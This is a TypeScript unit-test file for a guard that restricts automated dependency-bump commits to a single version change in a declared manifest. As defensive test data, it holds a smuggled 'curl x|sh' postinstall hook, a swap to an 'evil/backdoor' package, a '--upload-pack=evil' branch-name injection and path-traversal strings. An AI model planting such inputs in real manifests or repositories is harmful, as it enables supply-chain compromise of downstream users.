/**
 * `write-guard.ts` unit tests — the refusals that stand between a dependency subscription and a
 * commit in somebody else's repository (M21.5, ADR-0032 §8, PROJECT_CHARTER `scp-managed-dep`).
 *
 * RELOCATED, NOT REWRITTEN. These were built against the rival M21.5 branch's write hooks on
 * `GitProviderAdapter`. The owner's 2026-08-15 decision kept the guard layer and moved it beside its
 * one consumer, because where the HTTP happens is orthogonal to what may be written — so this file
 * moved with it, whole. What did NOT move is the composed-path section: `proposeManifestBump`
 * sequenced the three adapter hooks that no longer exist, and its property ("every refusal happens
 * before anything leaves the process") is now proven where the requests actually are, with a
 * counting client, in `repo-write.matrix.test.ts`.
 *
 * Every test here asserts the structured `RepoWriteRefusalReason`, never the message prose. That is
 * deliberate and it is what makes these mutation-proofs rather than wording pins: several refusals
 * overlap on the same input (a `go.sum` target is BOTH a lockfile and not-a-known-manifest; a
 * two-line edit is BOTH multiple-lines-changed and, usually, dependency-set-changed), so a test that
 * only asserted "it threw" would stay green with the specific control deleted. The reason code is
 * what distinguishes "the gate I am testing fired" from "some later gate caught it for me".
 */
import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import {
  RepoWriteRefusal,
  assertManifestEditProof,
  assertWriteBranch,
  assertWritePath,
  assertWriteRepo,
  basenameOf,
  isLockfileName,
  isRepoWriteRefusal,
  manifestParserFor,
  verifyManifestOnlyEdit,
  type ManifestEditProof,
  type RepoWriteRefusalReason
} from "./write-guard.js";

// -------------------------------------------------------------------------------------------
// Helpers
// -------------------------------------------------------------------------------------------

/** Runs `fn` and returns the `RepoWriteRefusal` it threw, failing the test if it threw anything
 *  else — or nothing. Returning the error (rather than asserting inside) lets each test name the
 *  exact reason it is pinning. */
function refusalFrom(fn: () => unknown): RepoWriteRefusal {
  let caught: unknown;
  try {
    fn();
  } catch (err) {
    caught = err;
  }
  if (caught === undefined) {
    throw new Error("expected a RepoWriteRefusal, but nothing was thrown");
  }
  if (!isRepoWriteRefusal(caught)) {
    throw new Error(
      `expected a RepoWriteRefusal, got ${caught instanceof Error ? caught.message : String(caught)}`
    );
  }
  return caught;
}

function expectRefusal(fn: () => unknown, reason: RepoWriteRefusalReason): RepoWriteRefusal {
  const refusal = refusalFrom(fn);
  expect(refusal.reason).toBe(reason);
  return refusal;
}

const GO_MOD_BASE = [
  "module github.com/acme/widgets",
  "",
  "go 1.22",
  "",
  "require (",
  "\tgithub.com/Masterminds/semver/v3 v3.2.1",
  "\tgithub.com/spf13/cobra v1.8.0",
  ")",
  ""
].join("\n");

/** The same file with ONLY semver's patch digit changed. */
const GO_MOD_BUMPED = GO_MOD_BASE.replace("v3.2.1", "v3.2.4");

const GO_MOD_DECLARED = ["go.mod"];

function goBumpInput(overrides: Partial<Parameters<typeof verifyManifestOnlyEdit>[0]> = {}) {
  return {
    path: "go.mod",
    declaredManifestPaths: GO_MOD_DECLARED,
    ecosystem: "go" as const,
    baseContent: GO_MOD_BASE,
    newContent: GO_MOD_BUMPED,
    coordinate: "github.com/Masterminds/semver/v3",
    ...overrides
  };
}

// -------------------------------------------------------------------------------------------
// The happy path first — every refusal below is only meaningful against a case that is ALLOWED.
// A suite of refusals with no negative control cannot tell "correctly strict" from "refuses
// everything", which is the vacuous-test shape.
// -------------------------------------------------------------------------------------------

describe("verifyManifestOnlyEdit — the negative control", () => {
  it("ACCEPTS a single declared-version change and reports exactly what moved", () => {
    const proof = verifyManifestOnlyEdit(goBumpInput());
    expect(proof.path).toBe("go.mod");
    expect(proof.ecosystem).toBe("go");
    expect(proof.coordinate).toBe("github.com/Masterminds/semver/v3");
    expect(proof.fromDeclared).toBe("v3.2.1");
    expect(proof.toDeclared).toBe("v3.2.4");
    expect(proof.signature).toMatch(/^[0-9a-f]{64}$/);
  });

  /**
   * A real bump in EVERY ecosystem M21 parses, because the gates are shared but the manifests are
   * not: `package.json` reports no `line` at all, `pom.xml` reports the line of the `<dependency>`
   * OPEN TAG (several lines above the version it carries), and `Dockerfile` splits one literal
   * `name:tag@digest` into two parsed fields. A gate tuned to one of those shapes and wrong for
   * another would refuse a legitimate bump for a whole language — which is why the accept side is
   * enumerated per ecosystem rather than sampled once.
   */
  it.each([
    [
      "npm / package.json",
      "npm" as const,
      "services/api/package.json",
      JSON.stringify({ name: "app", dependencies: { react: "^18.2.0" } }, null, 2),
      "^18.2.0",
      "^18.3.0",
      "react"
    ],
    [
      "python / requirements.txt",
      "python" as const,
      "requirements.txt",
      "requests==2.31.0\nurllib3==2.0.7\n",
      // The python parsers keep the OPERATOR in `declared` (`==2.31.0`, not `2.31.0`) — the
      // declared/pinned distinction is part of the statement, so the version text a bump may move
      // includes it.
      "==2.31.0",
      "==2.32.0",
      "requests"
    ],
    [
      "python / pyproject.toml",
      "python" as const,
      "pyproject.toml",
      '[project]\nname = "app"\ndependencies = ["requests==2.31.0"]\n',
      "==2.31.0",
      "==2.32.0",
      "requests"
    ],
    [
      "maven / pom.xml",
      "maven" as const,
      "pom.xml",
      [
        "<project>",
        "  <dependencies>",
        "    <dependency>",
        "      <groupId>org.springframework</groupId>",
        "      <artifactId>spring-core</artifactId>",
        "      <version>6.1.2</version>",
        "    </dependency>",
        "  </dependencies>",
        "</project>",
        ""
      ].join("\n"),
      "6.1.2",
      "6.1.3",
      "org.springframework:spring-core"
    ],
    [
      "oci / Dockerfile",
      "oci" as const,
      "Dockerfile",
      "FROM alpine:3.19\nRUN true\n",
      "3.19",
      "3.20",
      "alpine"
    ]
  ])("ACCEPTS a real bump — %s", (_label, ecosystem, path, base, from, to, coordinate) => {
    const proof = verifyManifestOnlyEdit({
      path,
      declaredManifestPaths: [path],
      ecosystem,
      baseContent: base,
      newContent: base.replace(from, to),
      coordinate
    });
    expect(proof.fromDeclared).toBe(from);
    expect(proof.toDeclared).toBe(to);
    expect(proof.coordinate).toBe(coordinate);
  });
});

describe("path gates", () => {
  it("basenameOf takes the last segment", () => {
    expect(basenameOf("a/b/go.mod")).toBe("go.mod");
    expect(basenameOf("go.mod")).toBe("go.mod");
  });

  it("REFUSES a lockfile as a lockfile — not merely as an unknown manifest", () => {
    // The reason matters: `go.sum` also fails the manifest allowlist, so deleting the lockfile
    // check would leave this input still refused. Only the reason code distinguishes them.
    expect(() => manifestParserFor("go", "go.sum")).toThrow(RepoWriteRefusal);
    expectRefusal(() => manifestParserFor("go", "go.sum"), "lockfile");
    expectRefusal(() => manifestParserFor("npm", "package-lock.json"), "lockfile");
    expectRefusal(() => manifestParserFor("npm", "pnpm-lock.yaml"), "lockfile");
    expectRefusal(() => manifestParserFor("python", "poetry.lock"), "lockfile");
    expectRefusal(() => manifestParserFor("maven", "gradle.lockfile"), "lockfile");
  });

  it("refuses a lockfile shape nobody enumerated, by structure", () => {
    expect(isLockfileName("something-lock.yaml")).toBe(true);
    expect(isLockfileName("vendor.lock")).toBe(true);
    expect(isLockfileName("packages.lock.json")).toBe(true);
    // ...and does not over-reach onto real manifests.
    expect(isLockfileName("go.mod")).toBe(false);
    expect(isLockfileName("package.json")).toBe(false);
    expect(isLockfileName("pyproject.toml")).toBe(false);
  });

  it("REFUSES a path that is not a manifest for its ecosystem", () => {
    expectRefusal(
      () => manifestParserFor("npm", ".github/workflows/ci.yml"),
      "not_a_known_manifest"
    );
    expectRefusal(() => manifestParserFor("npm", "Makefile"), "not_a_known_manifest");
    // ...and refuses the RIGHT manifest under the WRONG ecosystem, so the pair is the key.
    expectRefusal(() => manifestParserFor("npm", "go.mod"), "not_a_known_manifest");
    expectRefusal(() => manifestParserFor("go", "package.json"), "not_a_known_manifest");
  });

  it("accepts every spelling each ecosystem is actually edited through", () => {
    for (const [ecosystem, path] of [
      ["npm", "package.json"],
      ["go", "go.mod"],
      ["maven", "pom.xml"],
      ["python", "pyproject.toml"],
      ["python", "requirements.txt"],
      ["python", "requirements-dev.txt"],
      ["oci", "Dockerfile"],
      ["oci", "Containerfile"],
      ["oci", "Dockerfile.prod"],
      ["oci", "api.Dockerfile"]
    ] as const) {
      expect(() => manifestParserFor(ecosystem, path), `${ecosystem} ${path}`).not.toThrow();
    }
  });

  it("REFUSES a manifest the component's own inventory does not declare", () => {
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ declaredManifestPaths: ["services/api/go.mod"] })),
      "not_declared_by_component"
    );
    // An empty declared set refuses everything — absence is never permission.
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ declaredManifestPaths: [] })),
      "not_declared_by_component"
    );
  });
});

describe("content gates", () => {
  it("REFUSES a no-op edit", () => {
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: GO_MOD_BASE })),
      "content_unchanged"
    );
  });

  it("REFUSES content carrying a NUL byte", () => {
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\u0000` })),
      "content_not_text"
    );
  });

  it("REFUSES content over the shared byte ceiling", () => {
    expectRefusal(
      () =>
        verifyManifestOnlyEdit(
          goBumpInput({ newContent: `${GO_MOD_BUMPED}\n// ${"x".repeat(5 * 1024 * 1024)}` })
        ),
      "content_too_large"
    );
  });

  it("REFUSES an edit that changes more than one line", () => {
    const twoLines = GO_MOD_BUMPED.replace("v1.8.0", "v1.8.1");
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: twoLines })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES an edit that adds or removes a line, even a blank one", () => {
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: `${GO_MOD_BUMPED}\n` })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES an unparseable side rather than reading it as 'declares nothing'", () => {
    expectRefusal(
      () =>
        verifyManifestOnlyEdit(
          goBumpInput({ baseContent: "<html>404</html>", newContent: "<html>405</html>" })
        ),
      "unparseable_base"
    );
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: '{"dependencies":{"react":"^18.2.0"}}',
          newContent: '{"dependencies":{"react":"^18.3.0"',
          coordinate: "react"
        }),
      "unparseable_edit"
    );
  });
});

describe("the dependency SET may not change — the charter's 'never adds or removes a dependency'", () => {
  it("REFUSES an added dependency", () => {
    const withExtra = GO_MOD_BASE.replace(
      "\tgithub.com/spf13/cobra v1.8.0",
      "\tgithub.com/spf13/cobra v1.8.0\n\tgithub.com/pkg/errors v0.9.1"
    );
    // Line count changes too — so this is pinned by the reason, which says which gate fired.
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: withExtra })),
      "multiple_lines_changed"
    );
  });

  it("REFUSES a swap of one dependency for another on the SAME line — identical line count, identical dependency count", () => {
    // This is the case the line gate cannot see and the set gate must: one line, one declaration,
    // a different package. Deleting the identity comparison in gate 5 makes this test fail.
    const swapped = GO_MOD_BASE.replace(
      "\tgithub.com/spf13/cobra v1.8.0",
      "\tgithub.com/evil/backdoor v1.8.0"
    );
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ newContent: swapped })),
      "dependency_set_changed"
    );
  });

  it("REFUSES a re-scope (runtime -> dev) even when the version is untouched", () => {
    const base = JSON.stringify({ dependencies: { react: "^18.2.0" } }, null, 2);
    const moved = JSON.stringify({ devDependencies: { react: "^18.2.0" } }, null, 2);
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: moved,
          coordinate: "react"
        }),
      "dependency_set_changed"
    );
  });
});

describe("exactly ONE already-declared version may move", () => {
  it("REFUSES a one-line edit that moves no version at all", () => {
    const base = ["FROM alpine:3.19", 'LABEL org.opencontainers.image.title="app"', ""].join("\n");
    const edited = base.replace('title="app"', 'title="app2"');
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "Dockerfile",
          declaredManifestPaths: ["Dockerfile"],
          ecosystem: "oci",
          baseContent: base,
          newContent: edited,
          coordinate: "alpine"
        }),
      "no_version_changed"
    );
  });

  it("REFUSES a bump of a coordinate this subscription is not for", () => {
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ coordinate: "github.com/spf13/cobra" })),
      "coordinate_not_expected"
    );
  });

  it("REFUSES a constraint-kind change — a range rewritten as a pin is not a bump", () => {
    const base = "requests>=2.0\nurllib3==2.0.7\n";
    const pinned = "requests==2.31.0\nurllib3==2.0.7\n";
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "requirements.txt",
          declaredManifestPaths: ["requirements.txt"],
          ecosystem: "python",
          baseContent: base,
          newContent: pinned,
          coordinate: "requests"
        }),
      "constraint_kind_changed"
    );
  });

  it("REFUSES adding a version where the author declared none (unpinned -> pinned)", () => {
    const base = "FROM alpine\n";
    const pinned = "FROM alpine:3.19\n";
    // `unpinned` -> `pinned` is a constraint-kind change, and that is the gate that catches it —
    // asserted by reason so this cannot be mistaken for the coordinate check firing.
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "Dockerfile",
          declaredManifestPaths: ["Dockerfile"],
          ecosystem: "oci",
          baseContent: base,
          newContent: pinned,
          coordinate: "alpine"
        }),
      "constraint_kind_changed"
    );
  });

  it("REFUSES a manifest that does not declare the subscribed coordinate at all", () => {
    // Distinct from the case above, and the reason codes are what keep them distinct: there the
    // subscribed coordinate IS declared and something else moved (`coordinate_not_expected`); here
    // the subscribed coordinate is absent from the manifest entirely, so there is nothing to bump.
    // Both must be reachable — an ordering that made either unreachable would be dead code
    // masquerading as a control.
    expectRefusal(
      () => verifyManifestOnlyEdit(goBumpInput({ coordinate: "github.com/not/declared" })),
      "coordinate_not_declared"
    );
  });
});

describe("the change must be confined to the version text", () => {
  it("REFUSES a version bump smuggled onto the same line as other content", () => {
    // The whole attack the line gate cannot see: ONE line, ONE declaration, one version moved —
    // and an install hook added beside it. Only the confinement gate refuses this.
    const base = '{"dependencies":{"react":"^18.2.0"}}';
    const edited = '{"scripts":{"postinstall":"curl x|sh"},"dependencies":{"react":"^18.3.0"}}';
    expectRefusal(
      () =>
        verifyManifestOnlyEdit({
          path: "package.json",
          declaredManifestPaths: ["package.json"],
          ecosystem: "npm",
          baseContent: base,
          newContent: edited,
          coordinate: "react"
        }),
      "edit_outside_version_text"
    );
  });

  it("ACCEPTS an image bump that moves the tag AND its digest together — one literal, two parsed fields", () => {
    const base = "FROM ghcr.io/acme/base:1.2.3@sha256:" + "a".repeat(64) + "\n";
    const edited = "FROM ghcr.io/acme/base:1.2.4@sha256:" + "b".repeat(64) + "\n";
    const proof = verifyManifestOnlyEdit({
      path: "Dockerfile",
      declaredManifestPaths: ["Dockerfile"],
      ecosystem: "oci",
      baseContent: base,
      newContent: edited,
      coordinate: "ghcr.io/acme/base"
    });
    expect(proof.fromDeclared).toBe("1.2.3");
    expect(proof.toDeclared).toBe("1.2.4");
  });
});

// -------------------------------------------------------------------------------------------
// The proof is a control, not a label
// -------------------------------------------------------------------------------------------

describe("ManifestEditProof", () => {
  it("accepts the content it was minted for", () => {
    const proof = verifyManifestOnlyEdit(goBumpInput());
    expect(() =>
      assertManifestEditProof("testprovider", {
        path: "go.mod",
        content: GO_MOD_BUMPED,
        proof
      })
    ).not.toThrow();
  });

  it("REFUSES content mutated after verification — the proof binds to bytes, it does not travel with them", () => {
    const proof = verifyManifestOnlyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          path: "go.mod",
          content: `${GO_MOD_BUMPED}\nrequire github.com/evil/backdoor v1.0.0`,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a proof minted for a different path", () => {
    const proof = verifyManifestOnlyEdit(goBumpInput());
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", {
          path: "services/api/go.mod",
          content: GO_MOD_BUMPED,
          proof
        }),
      "proof_mismatch"
    );
  });

  it("REFUSES a hand-built proof — one that never passed verifyManifestOnlyEdit", () => {
    // The forgery an attacker (or a careless future caller) would actually attempt: a
    // structurally perfect proof over content that was never checked. The HMAC is what refuses it,
    // and this test fails the moment the signature check is dropped from assertManifestEditProof.
    const evil = "module x\n\nrequire github.com/evil/backdoor v1.0.0\n";
    const forged: ManifestEditProof = {
      path: "go.mod",
      ecosystem: "go",
      coordinate: "github.com/evil/backdoor",
      fromDeclared: "v0.9.0",
      toDeclared: "v1.0.0",
      // The correct hash of the evil content — so ONLY the signature can refuse this.
      contentSha256: createHash("sha256").update(evil, "utf8").digest("hex"),
      signature: "0".repeat(64)
    };
    expectRefusal(
      () =>
        assertManifestEditProof("testprovider", { path: "go.mod", content: evil, proof: forged }),
      "proof_mismatch"
    );
  });
});

// -------------------------------------------------------------------------------------------
// URL safety on the write path — the read path's asserts, reused
// -------------------------------------------------------------------------------------------

describe("write-path URL safety inherits the read path's asserts", () => {
  it("REFUSES a traversal repo, path and base ref", () => {
    expectRefusal(() => assertWriteRepo("p", "acme/widgets/../../.."), "unsafe_repo");
    expectRefusal(() => assertWriteRepo("p", "acme/widgets?x="), "unsafe_repo");
    expectRefusal(() => assertWritePath("p", "../../user"), "unsafe_path");
    expectRefusal(() => assertWritePath("p", "/etc/passwd"), "unsafe_path");
  });

  it("REFUSES a branch name that is not a plain branch name", () => {
    expectRefusal(() => assertWriteBranch("p", "../../../../user"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "refs/heads/x"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "HEAD"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "--upload-pack=evil"), "unsafe_branch");
    expectRefusal(() => assertWriteBranch("p", "a b"), "unsafe_branch");
  });

  it("accepts the branch names a bump actually uses", () => {
    for (const branch of ["scp/bump-semver-3.2.4", "scp-dep/go/semver", "main"]) {
      expect(() => assertWriteBranch("p", branch), branch).not.toThrow();
    }
  });
});
